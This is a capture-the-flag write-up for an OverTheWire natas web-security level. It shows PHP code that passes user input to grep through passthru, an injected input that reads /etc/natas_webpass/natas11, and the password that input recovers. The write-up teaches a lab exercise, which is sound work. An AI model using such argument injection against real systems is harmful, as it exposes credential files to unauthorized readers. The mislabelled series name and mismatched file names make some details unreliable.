# Level 11

Leviathan OverTheWire Level 11: [level 11](https://overthewire.org/wargames/natas/)

## Level 11 info
Find words containing: 


## Answer
We first look at the sourcecode to understand how this programs finds words
[here](http://natas10.natas.labs.overthewire.org/index-source.html)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
The only characters restricted are: ; | &

It seems like whatever we put in the input seems to be grepping. What if we give it an empty string and then search through a different file maybe /etc/natas_webpass/natas10

If we input:
```html
'' /etc/natas_webpass/natas11 #
```

We add the pound to ingore the dictionary.txt file 

```html
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

natas 11 password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk


## Level 11 Website
[natas11](http://natas11.natas.labs.overthewire.org)